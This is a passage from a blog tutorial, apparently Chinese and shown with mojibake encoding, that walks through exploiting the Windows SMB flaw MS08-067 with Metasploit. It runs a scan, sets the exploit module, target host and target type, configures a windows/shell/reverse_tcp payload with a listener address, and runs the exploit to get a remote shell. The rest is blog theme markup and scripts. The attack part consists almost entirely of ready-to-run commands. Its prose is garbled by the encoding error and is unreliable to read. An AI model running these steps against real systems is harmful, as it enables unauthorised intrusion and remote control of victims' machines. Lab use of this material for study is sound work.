<p>nmap -sS 192.168.1.1</p>
<p>search ms08-067</p>
<p>use exploit/windows/smb/ms08_067_netapi</p>
<p>show options</p>
<p>2ã€éœ€è¦é…ç½® RHOST ä¸»æœº IP åœ°å€å’Œ Exploit target</p>
<p>set RHOSTS 192.168.1.205</p>
<p>æŸ¥çœ‹ Exploit target ç›®æ ‡ç±»å‹ï¼š<br>show targets</p>
<p>set target 34</p>
<p>show options</p>
<p>3ã€è®¾ç½® payload æ¨¡å—ï¼Œä½¿å¾—æ¸—é€æˆåŠŸåè¿šè¡Œè¿›ç¨‹æ‰§è¡Œå‘½ä»¤</p>
<p>æŸ¥æ‰¾ payload æ¨¡å—ï¼Œæ‰¾åˆ°åº”ç”¨äºæ”»å‡»ä¸»æœºç›¸åŒçš„ç³»ç»Ÿç±»å‹ã€‚</p>
<p>search windows/shell/reverse_tcp</p>
<p>payload æ¨¡å—ä¸»è¦æ˜¯ç”¨äºå»ºç«‹ç›®æ ‡ä¸»æœºä¸æ”»å‡»æœºçš„é€£æ¥ï¼Œå¯è¿”å› shellã€‚å› æ­¤æ‰€éœ€è¦é€‰æ‹©ä¸€ä¸ªåå¼¹å¼ çš„ shell çš„ payload æ¨¡å—</p>
<p>è®¾ç½® payload æ¨¡å—ï¼š<br>set payload windows/shell/reverse_tcp</p>
<p>4ã€æŸ¥çœ‹ä¸€ä¸‹ payload æ¨¡å—ä¸­æœ‰å“ªäº›é€‰é¡¹éœ€è¦é…ç½®</p>
<p>éœ€è¦è®¾ç½® LHOST é€‰é¡¹ï¼Œå³æ˜¯ payload æ¨¡å—ç›‘å¬çš„åœ°å€ï¼ˆæœ¬æœºåœ°å€å³å¯ï¼‰ï¼š<br>set LHOST 192.168.1.101</p>
<p>6ã€å¼€å§‹åˆ©ç”¨è¯¥æ¨¡å—</p>
<p>exploit  </p>
<p>æ”»å‡»æˆåŠŸåï¼Œç›´æ¥è·å¾—ç›®æ ‡ä¸»æœºçš„ Shell</p>
    </div>
  </div>
  
    <div class="copy-right">
      <div class="markdown-body">
        <blockquote>
        
        
          æœ¬æ–‡ä½œè€… : JohnScott <br/>
        
        åŸæ–‡é“¾æ¥ : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/12Metasploit/</a><br>
        ç‰ˆæƒå£°æ˜ : æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
        </blockquote>
      </div>
    </div>
  
  
  
    <div class="social-share"
  style="margin-top: -2rem"
  data-wechat-qrcode-title="<p>å¾®ä¿¡æ‰«ä¸€æ‰«</p>"
  data-wechat-qrcode-helper="<p>å¾®ä¿¡å³ä¸Šè§’, æ‰«ä¸€æ‰«åˆ†äº«</p>"
   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
  
>
  <span style="color: #6b7487; font-size: 1.4rem;">åˆ†äº«åˆ°: </span>
</div>
<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
  

  
    <div id="reward">
  
    <p id="reward-meta">çŸ¥è¯† & æƒ…æ€€ | äºŒè€…å…¼å¾—</p>
  
  <button id="reward-btn">
    
    <span>æ„Ÿè°¢æ‚¨çš„å…³å¿ƒ</span>
  </button>
  <div id="reward-qrcode">
    
      <div class="reward-qrcode--container">
        <img class="qrcode-img" src="/images/wechat.png" alt="å¾®ä¿¡æ‰«ä¸€æ‰«">
        <p class="qrcode-meta">å¾®ä¿¡æ‰«ä¸€æ‰«</p>
      </div>
    
      <div class="reward-qrcode--container">
        <img class="qrcode-img" src="/images/alipay.png" alt="æ”¯ä»˜å®æ‰«ä¸€æ‰«">
        <p class="qrcode-meta">æ”¯ä»˜å®æ‰«ä¸€æ‰«</p>
      </div>
    
  </div>

</div>

<script>
  (() => {
    let button = document.querySelector('#reward-btn'),
      qrcode = document.querySelector('#reward-qrcode'),
      display = false;
    
    button.addEventListener('click', () => {
      qrcode.style.display = display ? 'none' : 'block'
      display = !display
    }, false)
  })()
</script>
  

  <div class="article-footer">
    <div class="article-meta pull-left">
      <span>
        
          <i class="iconfont icon-06tags"></i>æ ‡ç­¾: 
          
          <span class="span--tag">
            <a href="/tags/Metasploit/">
              #Metasploit
            </a>
          </span>
          
        
      </span>
    </div>
    <div class="article-meta pull-right">
    </div>
  </div>
</div>


  <aside id="sidebar">
    <p id="sidebar-header"></p>
    <ol id="sidebar-toc"></ol>
  </aside>
  <script async>setTimeout(generateToc, 10);</script>


  <nav class="post-navigation">
    
      <div class="nav-pre">
        <i class="iconfont icon-prev"></i>
        ä¸Šä¸€ç¯‡:
        <a href="/2021/11%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" target="_self">11Webæ¼æ´æ‰«æå·¥å…·</a>
      </div>
    
    
      <div class="nav-next">
        ä¸‹ä¸€ç¯‡:
        <a href="/2021/13Metasploit%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_self">13Metasploitä¿¡æ¯æœé›†</a>
        <i class="iconfont icon-next"></i>
      </div>
    
  </nav>

  
    <a href="#comment" class="comment-anchor"></a>
<div class="comment-title"><i class="iconfont icon-footprint"></i> ç•™ä¸‹è¶³è¿¹ <i class="iconfont icon-footprint"></i></div>
<div id="vcomments"></div>

<script defer>
  if( true ) {
    let path = getRealPath()
    new Valine({
      el: "#vcomments",
      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
      notify: false,
      verify: false,
      avatar: "robohash",
      placeholder: "æ­£ç¡®å¡«å†™é‚®ç®±, æ‰èƒ½åŠæ—¶æ”¶åˆ°å›å¤å“¦â™ª(^âˆ‡^*)",
      path
    });
  }
</script>
   

  
    <script defer>
const valineAPI = (() => {
  try {
    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
  } catch(error) {}
  const isExist = (identity) => {
    identity = identity || getRealPath();
    let query = new AV.Query('Timer');
    return new Promise((resolve, reject) => {
      query.equalTo("identity", identity);
      query.find().then(results => {
        resolve(results.length > 0);
      }, error => reject(error));
    })
  }

  const _get = (identity) => {
    let query = null;
    if(identity && identity instanceof Array){
      let querys = [];
      for(let i = 0; i < identity.length; ++i) {
        querys[i] = new AV.Query('Timer');
        querys[i].equalTo('identity', identity[i]);
      }
      query = AV.Query.or.apply(null ,querys);
    } else {
      identity = identity || getRealPath();
      query = new AV.Query("Timer");
      query.equalTo("identity", identity);
    }

    return new Promise((resolve, reject) => {
      query.find()
      .then(results => resolve(results))
      .catch(error => reject(error))
    })
  }

  const create = (identity) => {
    identity = identity || getRealPath();
    return new Promise((resolve, reject) => {
      let Todo = AV.Object.extend('Timer');
      let todo = new Todo();
      todo.set("times", 1);
      todo.set("identity", identity);
      todo.save().then(res => resolve(true), error => reject(error));
    })
  }

  const update = (identity) => {
    identity = identity || getRealPath();
    return new Promise((resolve, reject) => {
      let query = new AV.Query('Timer');
      query.equalTo("identity", identity);
      query.find().then(todos => {
        todos.forEach(todo => {
          todo.set("times", todo.attributes.times + 1);
        });
        return AV.Object.saveAll(todos);
      }).then(todos => resolve(true), error => reject(error));
    })
  }

  return {
    isExist,
    _get,
    update,
    create
  }
})()

const calcAndWriteTimes = () => {
  let isPost = true;

  let timerAllDOM = document.querySelectorAll(".article-timer");

  if(isPost) {
    let identity = timerAllDOM[0].getAttribute("data-identity");
    valineAPI.isExist(identity)
    .then(exist => {
      if(exist) {
        return valineAPI.update(identity);
      }
      return new Promise(resolve => resolve(true));
    })
    .then( succuess => valineAPI._get(identity))
    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
    .catch(error => console.log(error.message))
    return ;
  }

  let timerDOMCache = {};

  for(let timerDOM of timerAllDOM) {
    let identity = timerDOM.getAttribute("data-identity");
    if(timerDOMCache.hasOwnProperty(identity)){
      timerDOMCache[identity].dom.push(timerDOM);
    }else{
      timerDOMCache[identity] = {
        dom: [timerDOM],
        times: undefined
      };
    }
  }

  let identities = Object.keys(timerDOMCache);
  valineAPI._get(identities).then(results => {
    for(let result of results) {
      let {identity, times} = result.attributes;
      timerDOMCache[identity].times = times;
      timerDOMCache[identity].dom.map(item => item.innerText = times);
    }
    for(let identity of identities) {
      if(timerDOMCache[identity].times){
        continue;
      }
      timerDOMCache[identity].dom.map(item => item.innerText = 1);
      valineAPI.create(identity);
    }
  }).catch(error => console.log(error.message))
}

if(true){
  calcAndWriteTimes();
}
</script>
   

</div>


      <footer>
  <p class="site-info">
    åšå®¢å·²èŒèŒå“’è¿è¡Œ<span id="time-to-now"></span><span class="my-face">(â—'â—¡'â—)ï¾‰â™¥</span>
    <br>
    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With ğŸ’— | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
    <br>
    
  </p>
</footer>



<script>
const timeToNowDOM = document.querySelector("#time-to-now");
const startTimestamp = new Date(2015, 0, 1).getTime();

const updateTimeStr = () => {
  let offset = parseInt(
      (new Date().getTime() - startTimestamp) / 1000,
      10
    ),
    day = Math.floor(offset / 86400),
    hour = Math.floor((offset % 86400) / 3600),
    minute = Math.floor(((offset % 86400) % 3600) / 60),
    second = Math.floor(((offset % 86400) % 3600) % 60);
  timeToNowDOM.innerHTML =
    day + "å¤©" + hour + "å°æ—¶" + minute + "åˆ†é’Ÿ" + second + "ç§’";
  setTimeout(updateTimeStr, 500);
}

setTimeout(updateTimeStr, 500);
</script>


      <div class="back-to-top hidden">
  <span>
    <i class="iconfont icon-60"></i><span></span>%
  </span>
</div>

<script>
const updateIconToTop = percent => {
  let dom = document.querySelector(".back-to-top span span");
  dom.innerText = percent;
  if(percent < 1) {
    document.querySelector(".back-to-top").className = "back-to-top hidden";
  } else {
    document.querySelector(".back-to-top").className = "back-to-top";
  }
}

const handleScoll = () => {
  let isRunning = false;
  return () => {
    if (isRunning) return;
    isRunning = true;
    window.requestAnimationFrame(timestamp => {
      let scrollTop =
          document.documentElement.scrollTop || document.body.scrollTop,
        scrollHeight =
          document.documentElement.scrollHeight ||
          document.body.scrollHeight,
        clientHeight =
          document.documentElement.clientHeight ||
          document.body.clientHeight;
      isRunning = false;
      if (scrollTop <= 1) {
        updateIconToTop(0);
        return;
      }
      if (scrollTop + clientHeight >= scrollHeight) {
        updateIconToTop(100);
      } else {
        updateIconToTop(parseInt(
          100 * scrollTop / (scrollHeight - clientHeight),
          10
        ));
      }
    });
  };
}

const backToTop = () => {
  let scrollTop =
      document.documentElement.scrollTop || document.body.scrollTop,
    delay = 10,
    time = 200;
  if (scrollTop <= 20) {
    document.documentElement.scrollTop = 0;
    document.body.scrollTop = 0;
    return;
  }
  let step = Math.ceil(scrollTop * delay / time);
  let timer = setInterval(() => {
    scrollTop =
      document.documentElement.scrollTop || document.body.scrollTop;
    if (scrollTop - step <= 0) {
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;
      clearInterval(timer);
    } else {
      document.documentElement.scrollTop = scrollTop - step;
      document.body.scrollTop = scrollTop - step;
    }
  }, delay);
}

document.addEventListener("scroll", handleScoll(), false);

document.querySelector(".back-to-top").addEventListener("click", backToTop, false);

</script>

    </div>

    
      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
<script>
  (() => {
    const mathjaxConfig = {
      showProcessingMessages: false, //å…³é—­jsåŠ è½½è¿‡ç¨‹ä¿¡æ¯
      messageStyle: "none", //ä¸æ˜¾ç¤ºä¿¡æ¯
      jax: ["input/TeX", "output/HTML-CSS"],
      tex2jax: {
        inlineMath: [["$", "$"], ["\\(", "\\)"]], //è¡Œå†…å…¬å¼é€‰æ‹©ç¬¦
        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //æ®µå†…å…¬å¼é€‰æ‹©ç¬¦
        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //é¿å¼€æŸäº›æ ‡ç­¾
      },
      "HTML-CSS": {
        availableFonts: ["STIX", "TeX"], //å¯é€‰å­—ä½“
        showMathMenu: false //å…³é—­å³å‡»èœå•æ˜¾ç¤º
      }
    }

    let mathjaxInterval = setInterval(() => {
      if(!window.MathJax){
        return;
      }
      window.MathJax.Hub.Config(mathjaxConfig)
      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])

      clearInterval(mathjaxInterval)
    }, 10)    
  })()
</script>
    

    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
<script async>
  let fancyTimer = setInterval(function(){
    if(!window.$){
      return;
    }
    $(document).ready(function() {
      $(".post img").each(function () {
        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
          return;
        }
        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "gallery");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      });
      
      clearInterval(fancyTimer);
    });
  }, 10);
</script>

    
  </body>

</html>
